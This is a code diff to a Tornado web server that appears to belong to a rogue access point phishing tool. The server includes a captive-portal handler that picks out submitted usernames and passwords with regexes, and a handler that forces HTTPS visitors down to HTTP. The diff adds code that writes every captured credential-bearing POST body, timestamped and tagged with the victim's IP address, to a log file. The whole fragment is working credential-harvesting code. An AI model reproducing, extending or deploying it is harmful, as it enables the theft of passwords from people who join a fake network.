@@ -1,6 +1,8 @@
+import datetime
 import logging
 import json
 import re
+import time
 from tornado.escape import json_decode
 import tornado.ioloop
 import tornado.web
@@ -18,6 +20,7 @@ template = False
 terminate = False
 creds = []
 logger = logging.getLogger(__name__)
+credential_log_path = None
 
 
 class DowngradeToHTTP(tornado.web.RequestHandler):
@@ -131,7 +134,13 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
                 logger.info("POST request from %s with %s",
                             self.request.remote_ip, post_data)
             if re.search(constants.REGEX_PWD, post_data, re.IGNORECASE) or \
-            re.search(constants.REGEX_UNAME, post_data, re.IGNORECASE):
+               re.search(constants.REGEX_UNAME, post_data, re.IGNORECASE):
+                if credential_log_path:
+                    with open(credential_log_path, 'a+') as credential_log:
+                        credential_log.write("{} {}".format(
+                            time.strftime(constants.CREDENTIALS_DATETIME_FORMAT),
+                            "POST request from {0} with {1}\n".format(
+                                self.request.remote_ip, post_data)))
                 creds.append(post_data)
                 terminate = True
 
@@ -171,6 +180,7 @@ def runHTTPServer(ip, port, ssl_port, t, em):
     app.listen(port, address=ip)
 
     ssl_app = tornado.web.Application([(r"/.*", DowngradeToHTTP)])
+
     https_server = tornado.httpserver.HTTPServer(
         ssl_app,
         ssl_options={
